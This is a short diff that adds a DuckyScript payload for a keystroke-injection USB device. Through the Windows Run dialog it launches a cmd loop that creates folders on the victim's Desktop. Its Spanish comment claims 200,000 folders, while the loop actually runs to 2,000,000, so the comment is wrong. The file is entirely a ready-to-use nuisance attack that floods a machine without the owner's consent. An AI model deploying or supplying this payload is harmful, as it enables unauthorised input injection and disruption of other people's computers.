@@ -1,0 +1,6 @@
+REM Crear 200,000 carpetas en el escritorio
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd /c "for /L %i in (1,1,2000000) do mkdir %userprofile%\Desktop\folder%i"
+ENTER
